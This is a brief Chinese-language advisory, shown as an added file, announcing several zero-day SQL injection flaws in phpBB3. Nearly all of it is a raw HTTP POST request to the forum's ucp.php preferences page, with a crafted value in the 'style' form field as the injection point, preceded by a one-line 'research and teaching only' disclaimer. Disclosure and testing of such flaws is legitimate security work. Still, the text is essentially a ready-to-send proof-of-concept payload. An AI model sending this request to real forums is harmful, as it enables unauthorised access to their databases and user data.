@@ -1,0 +1,40 @@
+phpBB爆发多个Sql注入漏洞0day
+
+测试方法：
+ 
+以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！
+ 
+HauntIT （）提供了如下测试方法：
+ 
+Request :
+ ---
+ POST /kuba/phpBB/phpBB3/ucp.php?i=prefs&mode=personal HTTP/1.1
+ Host: localhost
+ User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-us,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Proxy-Connection: keep-alive
+ Referer: http://hake.cc/ kuba/phpBB/phpBB3/ucp.php?i=174
+ Cookie: style_cookie=null; phpbb3_t4h3b_u=2; phpbb3_t4h3b_k=; phpbb3_t4h3b_sid=
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 258
+ Connection: close
+ 
+
+viewemail=1
+ &massemail=1
+ &allowpm=1
+ &hideonline=0
+ &notifypm=1
+ &popuppm=0
+ &lang=en
+ &style=%2b1111111111
+ &tz=0
+ &dst=0
+ &dateoptions=D+M+d%2C+Y+g%3Ai+a
+ &dateformat=D+M+d%2C+Y+g%3Ai+a
+ &submit=Submit
+ &creation_time=1343370877
+ &form_token=576...
+ 
